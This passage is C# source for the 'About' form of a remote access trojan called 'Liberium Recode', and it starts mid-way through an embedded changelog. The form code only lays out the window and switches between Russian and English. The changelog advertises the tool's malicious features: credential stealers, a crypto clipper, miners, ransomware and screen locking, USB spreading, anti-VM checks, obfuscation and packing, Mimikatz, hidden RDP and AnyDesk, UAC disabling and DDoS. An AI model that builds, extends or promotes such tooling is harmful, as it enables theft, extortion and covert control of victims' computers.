tab. The point of this tab is that all installers will now be stored there.\n- Added \"Scheduler\" - Added the ability to disable and enable the scheduler in action.\n- Added \"System License\" - Authorization was made + bot.\n- Updated \"Icon\" - updated icons.\n- Updated \"Intelix Stealer\" - decryptions updated\n- Updated \"Salsa Stealer\" - decryptions updated\n- Updated \"Antarctida Stealer\" - decryptions updated\n- Updated \"Tasks\" - Now you can install more in tasks than before.\n- Updated \"Notificator\" - The design has been changed and a message is now displayed when a user is disconnected.\n- Rework \"Screamer\" - New form and also new types of screamers have been added.\n- Rework \"Sniffer\" - The sniffer has been transferred and now it sniffs https and requests.\n- Rework \"Custom Background\" - It has been redesigned so you can now set transparency instead of blur.\n- Rework \"FormAbout\" - Now the gif is replaced by a regular photo, and the server.exe size has been reduced.\n- Rework \"Auto Stealer\" - Now the auto stealer checks whether the user has a log or not and then sends the Intelix + Salsa stealer. If one doesn't collect it, it collects the other one.\n- Fixed \"NetExecutor\" - Now it works properly and without bugs.\n- Fixed \"Config/Client\" - works better now.\n- Fixed \"Style\" - now instead of black texts, white ones were made as they should be.\n\n[+] ChangeLog v2.8 [19.04.2026]\n- Rework \"Form1\" - Its statistics about users, etc., were reworked, or rather, all the garbage was removed.\n- Rework \"notifications\" - now have a different, beautiful, modern style.\n- Fixed bugs \"Form1\" - The bug that prevented you from stretching the form and changing its size has been fixed. Now you can.\n- Fixed bugs \"Form Camera\" - Now you can change the camera quality.\n- Added \"Auto Note\" - Now auto note automatically sets countries by user.\n- Added \"Copy to Logs\" - A button was added to the Logs tab to copy logs.\n- Added \"Background\" - a feature that allows you to set a custom background.\n- Added \"Miner Rigel\" - This function was available but not connected, but now it is connected and works.\n- Added \"Total Users\" - A counter for all your users, both offline and online.\n- Updated \"Clipper Panel\" - Updated: now you can clip Steam Trade and also Solana BNB and TON.\n- Updated \"Miner XMR\" - a hashreait panel was created.\n- Updated \"Miner ETC\" - remixed into Miner BZ.\n- Updated \"all handlers\" - validation was installed on each handler.\n\n[+] ChangeLog v2.7 [15.04.2026]\n- Removed \"Columns\" to \"Form1\" tab \"main\".\n- Fixed \"Dark theme\" - The dark theme was fixed in some forms.\n- The form text function in settings has been reworked.\n- Fixed \"DDos\" plugin - should work correctly\n- Rework \"Raindow Theme\" - Now only the panel with users is shimmering.\n- Fixed \"Style\" - Bugs with styles were fixed, in that there were duplicates and also colors did not match the themes, but everything was fixed.\n\n[+] ChangeLog v2.6 [08.04.2026]\n- Added \"USB Spread\" to \"FormBuilder\" - unpack your client onto a connected USB flash drive.\n- Added \"Process Critical\" - The function is installed on the Client so that it closes those processes that will interfere with its operation.\n- Added \"WMI Startup\" to \"FormBuilder\" - no work\n- Added \"Process Name\" to \"FormBuilder\" - changes the name of your \"Client\" process. (no work)\n- Added \"Boot Kit\" to \"FormBuilder\" - The function allows it to be sewn tightly into the system. (no work)\n- Added \"Anti Virtual\" to \"FormBuilder\" - The essence of the function is that it would be possible to enable or disable virtual machine locking.\n- Added \"Generate\" to \"FormBuilder\" - The essence of this button is in the 3rd tab; it is needed to generate the \"Assembly\" for your client.\n- Added \"Standart obfuscation\" - Functions have been added to enable or disable standard obfuscation from your Client.\n- Added \"Build VMP\" to \"FormBuilder\" - Obfuscate your build file with vmp obfuscation.\n- Added \"Build Reactor\" to \"FormBuilder\" - Obfuscate your build file under net reactor obfuscation.\n- Added \"Build Mpress\" to \"FormBuilder\" - Compresses your build file to the maximum state possible.\n- Added \"Build Donut\" to \"FormBuilder\" - build + conut.\n- Added \"Build SFX\" to \"FormBuilder\" - The point is that it creates an SFX build that will automatically unpack and run your file.\n\n[+] ChangeLog v2.5 [28.03.2026]\n- Added \"Import'IPs\" to \"FormBuilder\" - allows you to import your IP address\n- Added \"Import'IPp\" to \"FormBuilder\" - allows you to import your IP address:port\n- Added \"Reset\" to \"FormBuilder\" - resets everything to its normal state\n- Update \"Stealer\" new stealer \"Antarctida\"\n- Update Recovery Stealer plugin\n- Update \"BotKiller - The malware removal system has been improved.\" plugin\n- Update \"DiscordRPC - An animated discordrpc has been created.\" plugin\n- Added \"Ransomware - This plugin allows you to block a user's computer\" plugin\n- Added \"Windows Recovery - Allows you to enable and disable Windows Recovery\" plugin\n- Added \"Mimi Katz\" plugin\n- Added \"Net Executor - Allows you to inject scripts remotely into a user.\" plugin\n- Added \"Nmap\" plugin\n- Added \"Sniffer - Sniffer allows you to sniff networks\" plugin\n- Added \"Browser - Allows you to run browsers stealthily\" plugin\n- Added \"Hardware - A plugin that allows you to manage user disks.\" plugin\n- Added \"Firewall - Allows you to view the user's Firewall\" plugin\n- Added \"Scanner - The scanner scans the user's networks\" plugin\n- Added \"Arp Scanner - Arp Scanner is a plugin that allows you to view open ports on a user's IP address.\" plugin\n- Added \"Task Scheduler - Allows you to view the user's task scheduler\" plugin\n- Added \"Windows Restores - Allows the user to initiate a system reset\" plugin\n- Added \"Windows Customizer - Allows the user to customize the system\" plugin\n- Added \"Config\" to Client\n- New tab \"Columns\" \n\n[+] ChangeLog v2.4 [24.02.2026]\n- Fixed Stub - Fixed client spam in the scheduler\n- Added Recovery Stealer\n- Added \"Camera Demonstration - The plugin allows you to open a preview of your camera to the user.\" plugin\n- Added \"Reverse Tunnel - Allows port forwarding\" plugin\n- Added \"Reverse Forward - Allows port forwarding\" plugin\n- Update \"WinLocker - The colors have been updated and the blocker has also been improved.\"\n- Remove Playit Grabber - Allows you to steal plaiyt settings\n- Action plugin \"Fixed\" - Fixed all functions\n\n[+] ChangeLog v2.3 [20.02.2026]\n- Update \"Obfuscator Stub\"\n- Added \"Hidden RDP - Establishes RDP for the user\"\n- Added \"Offline users\"\n- Added \"Disable UAC - Allows the user to disable UAC\"\n- Added \"Mem Reduct - Loads the user's RAM\"\n- Added \"Hidden AnyDesk - Installs AnyDesk stealthily\"\n- Added tab \"Phishing\", \"Steam Guard\"\n- Added \"Hidden Installers - Installers of hidden packages on the user's PC\" \n- Added Screamer plugin - displays a scary image to the user\n- Added Fun Audio - Plays funny sounds to the user remotely\n- Added Desktop Demonstration - Allows you to share your screen with the user.\n- Fixed \"Stub\" Fixed spam Client process for task manager";
			groupBoxChangeLog.Text = "ChangeLog (English)";
		}
		UpdateButtonStyles();
	}

	private void UpdateButtonStyles()
	{
		bool num = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color activeColor = (num ? Color.FromArgb(60, 60, 60) : Color.FromArgb(230, 230, 230));
		Color inactiveColor = (num ? Color.FromArgb(40, 40, 40) : Color.White);
		if (currentLanguage == "en")
		{
			buttonRussian.BackColor = activeColor;
			buttonEnglish.BackColor = inactiveColor;
		}
		else
		{
			buttonRussian.BackColor = inactiveColor;
			buttonEnglish.BackColor = activeColor;
		}
	}

	private void buttonRussian_Click(object sender, EventArgs e)
	{
		LoadChangelog("ru");
	}

	private void buttonEnglish_Click(object sender, EventArgs e)
	{
		LoadChangelog("en");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormAbout));
		this.label2 = new System.Windows.Forms.Label();
		this.groupBoxChangeLog = new System.Windows.Forms.GroupBox();
		this.richTextBoxChangeLog = new System.Windows.Forms.RichTextBox();
		this.pictureBoxGif = new System.Windows.Forms.PictureBox();
		this.buttonRussian = new System.Windows.Forms.Button();
		this.buttonEnglish = new System.Windows.Forms.Button();
		this.groupBoxChangeLog.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.pictureBoxGif).BeginInit();
		base.SuspendLayout();
		this.label2.AutoSize = true;
		this.label2.Font = new System.Drawing.Font("Microsoft YaHei UI", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
		this.label2.ForeColor = System.Drawing.Color.Black;
		this.label2.Location = new System.Drawing.Point(5, 330);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(257, 154);
		this.label2.TabIndex = 1;
		this.label2.Text = "Coded by: @LiberiumSeller\r\n\r\nChannel: \"@DarkholeProjects\"\r\nType soft: \"RAT\"\r\nName soft: \"Liberium Recode\"\r\n\r\nVersion: 3.1 [RECODE]\r\n";
		this.groupBoxChangeLog.BackColor = System.Drawing.Color.White;
		this.groupBoxChangeLog.Controls.Add(this.richTextBoxChangeLog);
		this.groupBoxChangeLog.Font = new System.Drawing.Font("Microsoft YaHei", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
		this.groupBoxChangeLog.ForeColor = System.Drawing.Color.FromArgb(0, 128, 128);
		this.groupBoxChangeLog.Location = new System.Drawing.Point(268, 68);
		this.groupBoxChangeLog.Name = "groupBoxChangeLog";
		this.groupBoxChangeLog.Size = new System.Drawing.Size(559, 377);
		this.groupBoxChangeLog.TabIndex = 3;
		this.groupBoxChangeLog.TabStop = false;
		this.groupBoxChangeLog.Text = "ChangeLog";
		this.richTextBoxChangeLog.BackColor = System.Drawing.Color.White;
		this.richTextBoxChangeLog.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBoxChangeLog.Dock = System.Windows.Forms.DockStyle.Fill;
		this.richTextBoxChangeLog.Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.richTextBoxChangeLog.ForeColor = System.Drawing.Color.Black;
		this.richTextBoxChangeLog.Location = new System.Drawing.Point(3, 18);
		this.richTextBoxChangeLog.Name = "richTextBoxChangeLog";
		this.richTextBoxChangeLog.ReadOnly = true;
		this.richTextBoxChangeLog.Size = new System.Drawing.Size(553, 356);
		this.richTextBoxChangeLog.TabIndex = 0;
		this.pictureBoxGif.BackColor = System.Drawing.Color.White;
		this.pictureBoxGif.Image = (System.Drawing.Image)resources.GetObject("pictureBoxGif.Image");
		this.pictureBoxGif.Location = new System.Drawing.Point(6, 68);
		this.pictureBoxGif.Name = "pictureBoxGif";
		this.pictureBoxGif.Size = new System.Drawing.Size(256, 259);
		this.pictureBoxGif.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.pictureBoxGif.TabIndex = 4;
		this.pictureBoxGif.TabStop = false;
		this.buttonRussian.BackColor = System.Drawing.Color.White;
		this.buttonRussian.Cursor = System.Windows.Forms.Cursors.Hand;
		this.buttonRussian.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.buttonRussian.Font = new System.Drawing.Font("Segoe UI", 20f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.buttonRussian.Image = (System.Drawing.Image)resources.GetObject("buttonRussian.Image");
		this.buttonRussian.Location = new System.Drawing.Point(321, 451);
		this.buttonRussian.Name = "buttonRussian";
		this.buttonRussian.Size = new System.Drawing.Size(46, 33);
		this.buttonRussian.TabIndex = 5;
		this.buttonRussian.UseVisualStyleBackColor = false;
		this.buttonRussian.Click += new System.EventHandler(buttonRussian_Click);
		this.buttonEnglish.BackColor = System.Drawing.Color.White;
		this.buttonEnglish.Cursor = System.Windows.Forms.Cursors.Hand;
		this.buttonEnglish.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.buttonEnglish.Font = new System.Drawing.Font("Segoe UI", 20f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.buttonEnglish.Image = (System.Drawing.Image)resources.GetObject("buttonEnglish.Image");
		this.buttonEnglish.Location = new System.Drawing.Point(269, 451);
		this.buttonEnglish.Name = "buttonEnglish";
		this.buttonEnglish.Size = new System.Drawing.Size(46, 33);
		this.buttonEnglish.TabIndex = 6;
		this.buttonEnglish.UseVisualStyleBackColor = false;
		this.buttonEnglish.Click += new System.EventHandler(buttonEnglish_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(833, 488);
		base.Controls.Add(this.buttonEnglish);
		base.Controls.Add(this.buttonRussian);
		base.Controls.Add(this.pictureBoxGif);
		base.Controls.Add(this.groupBoxChangeLog);
		base.Controls.Add(this.label2);
		base.Name = "FormAbout";
		base.Padding = new System.Windows.Forms.Padding(3, 55, 3, 3);
		this.Text = "About";
		base.Load += new System.EventHandler(FormAbout_Load);
		this.groupBoxChangeLog.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.pictureBoxGif).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
